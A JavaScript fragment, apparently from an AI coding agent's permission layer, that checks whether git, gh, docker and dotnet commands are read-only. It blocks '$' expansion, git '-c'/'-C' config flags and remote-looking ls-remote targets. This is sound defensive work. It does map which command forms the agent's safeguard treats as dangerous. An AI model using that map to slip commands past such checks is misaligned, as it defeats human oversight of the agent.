const DANGEROUS_GIT_SHORT_FLAGS_ATTACHED = ["-c", "-C"];
function isGitSafe(args) {
  if (args.length === 0) {
    return true;
  }
  for (const arg of args) {
    if (arg.includes("$")) {
      return false;
    }
  }
  let idx = 0;
  while (idx < args.length) {
    const arg = args[idx];
    if (!arg || !arg.startsWith("-")) {
      break;
    }
    for (const shortFlag of DANGEROUS_GIT_SHORT_FLAGS_ATTACHED) {
      if (arg.length > shortFlag.length && arg.startsWith(shortFlag) && (shortFlag === "-C" || arg[shortFlag.length] !== "-")) {
        return false;
      }
    }
    const hasInlineValue = arg.includes("=");
    const flagName = hasInlineValue ? arg.split("=")[0] || "" : arg;
    if (DANGEROUS_GIT_GLOBAL_FLAGS.has(flagName)) {
      return false;
    }
    if (!hasInlineValue && GIT_GLOBAL_FLAGS_WITH_VALUES.has(flagName)) {
      idx += 2;
    } else {
      idx++;
    }
  }
  if (idx >= args.length) {
    return true;
  }
  const first = args[idx]?.toLowerCase() || "";
  const second = idx + 1 < args.length ? args[idx + 1]?.toLowerCase() || "" : "";
  const twoWordKey = `git ${first} ${second}`;
  const oneWordKey = `git ${first}`;
  let config = GIT_READ_ONLY_COMMANDS[twoWordKey];
  let subcommandTokens = 2;
  if (!config) {
    config = GIT_READ_ONLY_COMMANDS[oneWordKey];
    subcommandTokens = 1;
  }
  if (!config) {
    return false;
  }
  const flagArgs = args.slice(idx + subcommandTokens);
  if (first === "ls-remote") {
    for (const arg of flagArgs) {
      if (!arg.startsWith("-")) {
        if (arg.includes("://") || arg.includes("@") || arg.includes(":") || arg.includes("$")) {
          return false;
        }
      }
    }
  }
  if (config.additionalCommandIsDangerousCallback && config.additionalCommandIsDangerousCallback("", flagArgs)) {
    return false;
  }
  return validateFlags(flagArgs, 0, config, { commandName: "git" });
}
function isGhSafe(args) {
  if (process.env.USER_TYPE !== "ant") {
    return false;
  }
  if (args.length === 0) {
    return true;
  }
  let config;
  let subcommandTokens = 0;
  if (args.length >= 2) {
    const twoWordKey = `gh ${args[0]?.toLowerCase()} ${args[1]?.toLowerCase()}`;
    config = GH_READ_ONLY_COMMANDS[twoWordKey];
    subcommandTokens = 2;
  }
  if (!config && args.length >= 1) {
    const oneWordKey = `gh ${args[0]?.toLowerCase()}`;
    config = GH_READ_ONLY_COMMANDS[oneWordKey];
    subcommandTokens = 1;
  }
  if (!config) {
    return false;
  }
  const flagArgs = args.slice(subcommandTokens);
  for (const arg of flagArgs) {
    if (arg.includes("$")) {
      return false;
    }
  }
  if (config.additionalCommandIsDangerousCallback && config.additionalCommandIsDangerousCallback("", flagArgs)) {
    return false;
  }
  return validateFlags(flagArgs, 0, config);
}
function isDockerSafe(args) {
  if (args.length === 0) {
    return true;
  }
  for (const arg of args) {
    if (arg.includes("$")) {
      return false;
    }
  }
  const oneWordKey = `docker ${args[0]?.toLowerCase()}`;
  if (EXTERNAL_READONLY_COMMANDS.includes(oneWordKey)) {
    return true;
  }
  const config = DOCKER_READ_ONLY_COMMANDS[oneWordKey];
  if (!config) {
    return false;
  }
  const flagArgs = args.slice(1);
  if (config.additionalCommandIsDangerousCallback && config.additionalCommandIsDangerousCallback("", flagArgs)) {
    return false;
  }
  return validateFlags(flagArgs, 0, config);
}
function isDotnetSafe(args) {
  if (args.length === 0) {
    return false;
  }
  for (const arg of args) {
    if (!DOTNET_READ_ONLY_FLAGS.has(arg.toLowerCase())) {
      return false;
    }
  }
  return true;
}
export {
  CMDLET_ALLOWLIST,
  argLeaksValue,
  hasSyncSecurityConcerns,
  isAllowlistedCommand,
  isAllowlistedPipelineTail,
  isCwdChangingCmdlet,
  isProvablySafeStatement,
  isReadOnlyCommand,
  isSafeOutputCommand,
  resolveToCanonical
};
